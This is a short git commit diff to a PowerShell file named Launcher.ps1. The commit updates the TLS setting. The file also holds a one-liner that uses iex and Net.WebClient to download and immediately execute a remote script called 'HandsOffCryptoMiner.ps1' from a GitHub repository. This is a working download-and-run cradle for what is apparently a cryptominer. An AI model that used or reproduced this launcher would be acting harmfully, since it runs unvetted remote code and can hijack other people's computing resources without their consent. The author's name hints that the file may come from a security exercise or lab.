ca40eabe6edba10bbfbd1fa2edc078349451d589
BlueTeamByDay <56196267+BlueTeamByDay@users.noreply.github.com>
2020-03-12 12:03:17 -0400

    Update Launcher.ps1

--- Launcher.ps1
+++ Launcher.ps1
@@ -1,2 +1,3 @@
-[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"
+#[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BlueTeamByDay/FlyingGoats/master/HandsOffCryptoMiner.ps1')"
